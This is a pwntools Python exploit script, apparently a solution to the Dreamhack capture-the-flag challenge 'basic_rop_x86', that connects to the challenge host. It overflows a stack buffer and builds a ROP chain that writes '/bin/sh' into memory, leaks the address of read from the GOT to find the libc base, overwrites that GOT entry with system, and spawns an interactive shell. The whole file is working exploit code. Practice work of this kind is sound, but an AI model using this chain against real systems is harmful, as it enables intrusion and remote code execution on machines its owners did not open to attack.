#!/usr/bin/env python3

from pwn import *

exe = ELF("basic_rop_x86_patched", checksec = False)
libc = ELF("libc.so.6", checksec = False)
ld = ELF("ld-2.35.so", checksec = False)

context.binary = exe


if args.LOCAL:
    p = process(exe.path)
else:
    p = remote("host3.dreamhack.games", 13190)

rop_gadget = 0x08048689
writeAbleArea = 0x804a100
ret = 0x08048622
# input()
# write /bin/sh in write able area
payload = b'a'*0x48 + p32(exe.plt['read'])
payload += p32(rop_gadget) + p32(0) + p32(writeAbleArea) + p32(len("/bin/sh"))

# leak readgot
payload += p32(exe.plt['write'])
payload += p32(rop_gadget) + p32(1) + p32(exe.got.read) + p32(4)

# overwrite system
payload += p32(exe.plt['read'])
payload += p32(rop_gadget) + p32(0) + p32(exe.got.read) + p32(len(str(exe.got.read)))

#call system(writeable)
payload += p32(exe.plt.read)
payload += p32(ret) + p32(writeAbleArea)

p.sendline(payload)

p.send(b'/bin/sh')

p.recvuntil(b'a'*64)
libc_leak = u32(p.recv(4))
libc.address = libc_leak - libc.sym.read
log.info("libc leak: " + hex(libc_leak))
log.info("libc base: " + hex(libc.address))

p.sendline(p32(libc.sym.system))


p.interactive()

